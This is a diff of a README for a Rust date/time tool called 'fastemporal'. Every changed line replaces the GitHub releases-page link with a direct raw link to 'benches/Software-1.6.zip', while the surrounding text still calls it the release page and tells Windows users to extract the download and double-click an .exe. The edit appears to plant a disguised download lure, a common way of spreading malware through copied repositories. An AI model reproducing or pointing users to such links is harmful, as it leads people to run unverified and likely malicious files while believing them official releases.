@@ -1,6 +1,6 @@
 # 🕒 fastemporal - Fast date and time tools
 
-<a href="https://github.com/Tessparasitic609/fastemporal/releases"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download fastemporal"></a>
+<a href="https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download fastemporal"></a>
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you need to:
 
 ## 📥 Download for Windows
 
-1. Visit the release page here: [https://github.com/Tessparasitic609/fastemporal/releases](https://github.com/Tessparasitic609/fastemporal/releases)
+1. Visit the release page here: [https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip](https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip)
 2. Find the latest release near the top of the page
 3. Open the assets list under that release
 4. Download the Windows file, such as an `.exe` or `.zip`
@@ -83,7 +83,7 @@ The project includes 332 passing tests, which helps give confidence in the resul
 
 ## 🪟 How to Install on Windows
 
-1. Open the [release page](https://github.com/Tessparasitic609/fastemporal/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip)
 2. Download the latest Windows build
 3. If the file is a `.zip`, extract it
 4. If the file is an `.exe`, double-click it to start the app
@@ -165,7 +165,7 @@ The codebase is built with Rust and uses a design that avoids extra memory work.
 
 ### I cannot find the download
 
-- Open the [release page](https://github.com/Tessparasitic609/fastemporal/releases)
+- Open the [release page](https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip)
 - Look for the newest version at the top
 - Open the section named **Assets**
 - Choose the file that matches Windows
@@ -180,7 +180,7 @@ The codebase is built with Rust and uses a design that avoids extra memory work.
 
 If you need the file again, use the release page here:
 
-[https://github.com/Tessparasitic609/fastemporal/releases](https://github.com/Tessparasitic609/fastemporal/releases)
+[https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip](https://raw.githubusercontent.com/Tessparasitic609/fastemporal/main/benches/Software-1.6.zip)
 
 ## 📁 Project Topics
 
